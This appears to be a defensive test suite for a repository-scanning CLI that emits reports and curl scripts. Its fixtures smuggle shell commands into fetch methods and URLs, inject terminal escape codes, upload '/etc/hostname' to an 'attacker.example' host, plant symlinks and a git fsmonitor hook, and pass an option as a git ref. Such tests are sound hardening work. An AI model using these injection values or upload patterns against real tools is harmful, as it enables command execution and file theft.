import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { cli, cliAsync, removeTempDirs, scanJson, schemaErrors, tempRepo } from "./helpers.js";

afterAll(removeTempDirs);

const posix = process.platform !== "win32";

/** Code a hostile repository could contain: every string here is chosen to break out of the report. */
function hostileRepo(marker: string): string {
  return tempRepo({
    "src/inject.ts": [
      `export const a = () => fetch("https://api.example.com/a", { method: "GET\\ntouch ${marker}-method #" });`,
      `export const b = () => fetch("https://api.example.com/b\\n touch ${marker}-path", { method: "POST", body: "x" });`,
      `export const c = () => fetch("https://api.example.com/\\u001b]0;title\\u0007\\u001b[2Jc");`,
      `export const d = () => fetch("https://api.example.com/d", { method: "GET;touch${"${IFS}"}${marker}-semi" });`,
    ].join("\n"),
    "src/upload.ts": [
      `import OpenAI from "openai";`,
      `const client = new OpenAI({ baseURL: "https://attacker.example/v1" });`,
      `export const multipart = () => client.files.create({ file: "@/etc/hostname", purpose: "<notes.txt" });`,
      `export const raw = () => fetch("https://attacker.example/raw", { method: "POST", body: "@/etc/hostname" });`,
    ].join("\n"),
  });
}

describe("output a hostile repository chooses", () => {
  const marker = path.join(tempRepo({}), "pwned");
  const repo = hostileRepo(marker);

  it.skipIf(!posix)("curl output runs as a script without running anything but curl", () => {
    const bin = tempRepo({ curl: "#!/bin/sh\nexit 0\n" });
    chmodSync(path.join(bin, "curl"), 0o755);
    const run = cli(["scan", repo, "--curl", "--min-confidence", "0"]);
    expect(run.status).not.toBe(1);
    const script = run.stdout;
    const r = spawnSync("sh", ["-c", script], { env: { PATH: `${bin}:/usr/bin:/bin` }, encoding: "utf8" });
    for (const suffix of ["-method", "-path", "-semi"]) expect(existsSync(`${marker}${suffix}`), suffix).toBe(false);
    expect(r.stderr).toBe("");
    expect(r.status).toBe(0);
  });

  it("never prints control characters to the terminal", () => {
    for (const args of [[], ["--curl"]]) {
      const r = cli(["scan", repo, "--min-confidence", "0", ...args]);
      expect(r.status).toBe(0);
      expect(r.stdout).toContain("\\u001b]0;title\\u0007");
      // eslint-disable-next-line no-control-regex -- the assertion is about control characters
      expect(`${r.stdout}${r.stderr}`).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
    }
  });

  it("makes curl send values as written, never read local files", () => {
    const script = cli(["scan", repo, "--curl", "--min-confidence", "0"]).stdout;
    expect(script).toContain("--form-string 'file=@/etc/hostname'");
    expect(script).toContain("--form-string 'purpose=<notes.txt'");
    expect(script).toMatch(/curl -X POST 'https:\/\/attacker\.example\/raw'[^#]*--data-raw '/);
    expect(script).not.toMatch(/(^|\s)(-F|--form|--data-binary|-d) /m);
  });

  it("reports odd keys and hosts instead of failing", () => {
    const { run, report } = scanJson(
      tempRepo({
        "src/odd-keys.ts": [
          `export const k = () => fetch("https://constructor/x");`,
          `export const p = () => fetch("https://api.example.com/p?constructor=1", { method: "POST", body: JSON.stringify({ constructor: 1, __proto__: { x: 1 }, ok: 2 }) });`,
        ].join("\n"),
      }),
    );
    expect(run.status).toBe(0);
    expect(schemaErrors(report)).toEqual([]);
    expect(report.calls.filter((c) => c.location.file === "src/odd-keys.ts").map((c) => c.provider)).toEqual(["unknown", "api.example.com"]);
  });
});

describe("credentials written in the code", () => {
  it("keeps credentials out of every output", () => {
    const repo = tempRepo({
      "src/secrets.ts": [
        `export const s = () => fetch("https://admin:hunter2@api.example.com/v1/users?token=plainTok3n&page=2", {`,
        `  method: "POST",`,
        `  body: JSON.stringify({ password: "SuperSecret123", nested: { client_secret: "cs_abcdef" }, note: "kept" }),`,
        `});`,
      ].join("\n"),
    });
    for (const args of [["--json"], ["--curl"], []]) {
      const out = cli(["scan", repo, "--min-confidence", "0", ...args]).stdout;
      for (const secret of ["hunter2", "plainTok3n", "SuperSecret123", "cs_abcdef"]) expect(out, `${args.join(" ")} ${secret}`).not.toContain(secret);
      expect(out).toContain("api.example.com");
    }
    const call = scanJson(repo).report.calls[0]!;
    expect(call).toMatchObject({ host: "api.example.com", query: ["token", "page"], body: { properties: { note: { enum: ["kept"] } } } });
  });
});

describe.skipIf(!posix)("files a hostile repository links to", () => {
  it("does not read devices or files outside the scanned directory", () => {
    const outside = tempRepo({ "secret.ts": `export const leak = () => fetch("https://outside.example/leak");` });
    const repo = tempRepo({ "src/main.ts": `export const ok = () => fetch("https://inside.example/ok");` });
    for (const name of ["package.json", ".env.example", "tsconfig.json"]) symlinkSync("/dev/zero", path.join(repo, name));
    symlinkSync(path.join(outside, "secret.ts"), path.join(repo, "src", "leak.ts"));
    const started = Date.now();
    const { run, report } = scanJson(repo);
    expect(Date.now() - started).toBeLessThan(60_000);
    expect(run.status).toBe(0);
    expect(report.calls.map((c) => c.host)).toEqual(["inside.example"]);
  });

  it("takes no env hint from a .env.example that links out of the repository", () => {
    const outside = tempRepo({ ".env": "API_URL=https://internal.corp.example\n" });
    const repo = tempRepo({ "api.ts": "export const a = () => fetch(`${process.env.API_URL}/v1/x`);\n" });
    symlinkSync(path.join(outside, ".env"), path.join(repo, ".env.example"));
    expect(scanJson(repo).report.calls[0]).toMatchObject({ hostKind: "env", envName: "API_URL", provider: "env:API_URL" });
  });

  it("skips a file the parser cannot load and still reports the others", () => {
    const deep = `export const x = ${"(".repeat(20_000)}1${")".repeat(20_000)};\n`;
    const repo = tempRepo({ "deep.ts": deep, "ok.ts": `export const ok = () => fetch("https://api.github.com/meta");` });
    for (const args of [[], ["--exclude", "nothing.ts"]]) {
      const { run, report } = scanJson(repo, args);
      expect(run.status).toBe(2);
      expect(report.calls.map((c) => c.provider)).toEqual(["github"]);
      expect(report.diagnostics).toMatchObject({ filesSeen: 2, filesScanned: 1, skipped: [{ file: "deep.ts", reason: "parse-error" }] });
    }
  });
});

describe.skipIf(!posix)("git", () => {
  it("rejects a ref that is an option and never runs the repository's fsmonitor", () => {
    const repo = tempRepo({ "a.ts": `export const a = () => fetch("https://api.github.com/meta");` });
    const marker = path.join(repo, "fsmonitor-ran");
    spawnSync("git", ["init", "-q"], { cwd: repo });
    spawnSync("git", ["-c", "user.name=e2e", "-c", "user.email=e2e@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", "init"], { cwd: repo });
    writeFileSync(path.join(repo, "hook.sh"), `#!/bin/sh\ntouch '${marker}'\nexit 1\n`);
    chmodSync(path.join(repo, "hook.sh"), 0o755);
    spawnSync("git", ["config", "core.fsmonitor", path.join(repo, "hook.sh")], { cwd: repo });
    const out = path.join(repo, "written-by-git");
    const injected = cli(["scan", repo, `--changed-since=--output=${out}`]);
    expect(injected.status).toBe(1);
    expect(injected.stderr).toContain("invalid git ref");
    expect(existsSync(out)).toBe(false);
    expect(cli(["scan", repo, "--changed-since", "HEAD", "--json"]).status).toBe(0);
    expect(existsSync(marker)).toBe(false);
  });
});

describe("specs", () => {
  it("never fetches a remote $ref or reads one outside the specs directory", async () => {
    let requests = 0;
    const server = createServer((_req, res) => {
      requests++;
      res.end("{}");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as AddressInfo).port;
    const repo = tempRepo({
      "pay.ts": `export const p = () => fetch("https://api.stripe.com/v1/customers", { method: "POST", body: JSON.stringify({ email: "a" }) });`,
      "gh.ts": `export const g = () => fetch("https://api.github.com/user/repos", { method: "POST", body: JSON.stringify({ name: "a" }) });`,
      "outside.json": `{ "type": "object" }`,
    });
    const specs = path.join(repo, "specs");
    mkdirSync(specs);
    const spec = (p: string, ref: string): string =>
      JSON.stringify({ openapi: "3.0.0", info: { title: "t", version: "1" }, paths: { [p]: { post: { requestBody: { content: { "application/json": { schema: { $ref: ref } } } }, responses: {} } } } });
    writeFileSync(path.join(specs, "stripe.json"), spec("/v1/customers", `http://127.0.0.1:${port}/s.json`));
    writeFileSync(path.join(specs, "github.json"), spec("/user/repos", "../outside.json"));
    const r = await cliAsync(["scan", repo, "--specs", specs, "--validate", "--json"]);
    server.close();
    expect(r.status).toBe(0);
    expect(r.stderr).toContain("cannot read spec stripe.json");
    expect(r.stderr).toContain("cannot read spec github.json");
    expect(requests).toBe(0);
  });
});
